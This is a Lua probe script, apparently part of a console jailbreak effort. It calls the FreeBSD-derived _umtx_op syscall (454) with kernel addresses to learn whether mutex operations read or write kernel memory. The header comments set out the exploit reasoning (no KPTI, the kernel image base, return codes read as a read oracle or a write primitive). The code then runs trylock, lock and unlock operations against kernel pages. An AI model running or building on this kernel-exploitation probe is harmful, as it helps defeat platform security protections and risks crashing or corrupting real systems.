-- CRASH_CLASS: HIGH
-- PROBE 1421a: _umtx_op(454) with KERNEL addresses
--
-- prior art:
--   probes/phase17_new_vectors/543a_umtx_contested_bit.lua
--     call shape: mk(454)(obj, op, val, uaddr1, uaddr2); op 5 MUTEX_LOCK writes a
--     TID-shaped owner word, op 6 MUTEX_UNLOCK clears it.
--   results/... 56i2 section [F] and 152k: op 5 / op 21 return 0 and op 5 writes the
--     owner word on a USER page.  UMTX_OP_WAIT blocks on a value match; NWAKE returns 0;
--     UMTX_OP_SHM (25) and ROBUST_LISTS (26) are stubs.
--   docs/UMTX_454_EVIDENCE.md: the phase-1/2 "umtx" probes actually called 557, so the
--     only saved 454 bodies are 56i2's section [F] and 152k.
--   Every one of the ~20 umtx probes in probes/ passes a USER address.  The 532-676
--     arg1 class sweep (results/phase35_dead_end_reruns/1342a_arg1_sweep_589_plus_20261109_101254.txt)
--     covered the K class for 11 Sony syscalls only; 454 is a BSD-range syscall and was
--     never tested with a supervisor pointer.
--   docs/FAULT_CODE_ORACLE_14_10.md: 0xFFFFFFFFC0000000 is a present stub page and the
--     kernel image is at 0xFFFFFFFFC1000000 (102 MB); 0xFFFFFFFFD0000000 is ABSENT.
--
-- Reading: FreeBSD's umtx accessors use fueword/suword-style macros that rely on the
-- access fault handler instead of an explicit user-range predicate, unlike Sony's copyout
-- wrapper 0x2591d0 which validates the destination.  This console has no KPTI.
-- If op 4 (MUTEX_TRYLOCK, non-blocking) accepts a kernel address, the answer classifies
-- the dword there:
--     EFAULT  -> the address is range-checked, the whole lead is dead
--     EBUSY   -> the kernel READ a non-zero dword out of kernel memory  (read oracle)
--     0       -> the kernel WROTE our owner word into kernel memory     (write primitive)
-- and a following op 6 (MUTEX_UNLOCK) or op 21 clears it back to zero.
--
-- Method: control on a user page first, then TryLock over five kernel addresses and three
-- controls, then unlock whatever took the lock, then one WAIT with a value that must not
-- match, then two write-shaped ops on the stub page only.  Write-shaped ops are last.

print("=== PROBE 1421a: UMTX 454 KERNEL ADDRESS ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function sg(v) local n = N(v) if n >= 0x8000000000000000 then return n - 0x10000000000000000 end return n end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end
local function hex4(v) if v == nil then return "????????" end return string.format("%08X", v) end

local sc477 = mk(477)
local function mmap_raw(addr, len, prot, flags, fd, off)
    local va = N(sc477(uint64(addr), uint64(len), uint64(prot), uint64(flags),
        uint64(fd or 0xFFFFFFFF), uint64(off or 0)))
    if va < 0x10000 or va > 0x8000000000 then return nil end
    return va
end

local sc454 = mk(454)
local function umtx(obj, op, val, u1, u2)
    local ok, rv = pcall(function() return sc454(uint64(obj), uint64(op), uint64(val or 0), uint64(u1 or 0), uint64(u2 or 0)) end)
    if not ok then return "EXC" end
    return sg(rv)
end
local function show(tag, obj, op, val)
    local rv = umtx(obj, op, val)
    print(string.format("  %s op=%d obj=0x%X val=0x%X -> rv=%s errno=%s", tag, op, obj, val or 0, tostring(rv), es()))
    return rv
end

local pid = sg(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", pid))

local U = mmap_raw(0, 0x3000, 3, 0x1002, nil, 0)
print(string.format("[0] user page 0x%X", U))
pcall(function() memory.write_dword(U, 0) end)
pcall(function() memory.write_dword(U + 0x1000, 0) end)

-- ---------------------------------------------------------------- A: control
print("[A] control on a user page")
show("A", U, 4, 0)                       -- MUTEX_TRYLOCK
print(string.format("    word now = %s", hex4(rd(U))))
show("A", U, 6, 0)                       -- MUTEX_UNLOCK
print(string.format("    word now = %s", hex4(rd(U))))
show("A", U, 5, 0)                       -- MUTEX_LOCK
print(string.format("    word now = %s", hex4(rd(U))))
show("A", U, 21, 0)                      -- MUTEX_UNLOCK_PRIVATE
print(string.format("    word now = %s", hex4(rd(U))))

-- ---------------------------------------------------------------- B: kernel addresses
print("[B] MUTEX_TRYLOCK (op 4) on kernel addresses")
local K = {
    { "stub  0xFFFFFFFFC0000000", 0xFFFFFFFFC0000000 },
    { "stub+0x1000",              0xFFFFFFFFC0001000 },
    { "image 0xFFFFFFFFC1000000", 0xFFFFFFFFC1000000 },
    { "image+0x100000",           0xFFFFFFFFC1100000 },
    { "image+0x4000000",          0xFFFFFFFFC5000000 },
    { "absent 0xFFFFFFFFD0000000", 0xFFFFFFFFD0000000 },
    { "unmapped user 0x1000",     0x1000 },
}
local wrote = {}
for _, e in ipairs(K) do
    local rv = show(e[1], e[2], 4, 0)
    if rv == 0 then wrote[#wrote + 1] = e[2] end
end

-- ---------------------------------------------------------------- C: restore anything taken
print("[C] unlock every kernel address that took the lock")
if #wrote == 0 then print("  none") end
for _, a in ipairs(wrote) do
    show("C", a, 6, 0)
    show("C", a, 21, 0)
end

-- ---------------------------------------------------------------- D: WAIT with a non-matching value
print("[D] WAIT (op 2) with an unlikely value, non-blocking if the dword differs")
for _, e in ipairs(K) do
    if e[2] >= 0xFFFFFFFFC0000000 then
        show(e[1], e[2], 2, 0x5A5A5A5A)
    end
end

-- ---------------------------------------------------------------- E: write-shaped ops, stub page only
print("[E] MUTEX_LOCK (op 5) then UNLOCK on the stub page")
show("E", 0xFFFFFFFFC0000000, 5, 0)
show("E", 0xFFFFFFFFC0000000, 6, 0)
print(string.format("  user word still %s", hex4(rd(U))))
print("=== PROBE 1421a COMPLETE ===")
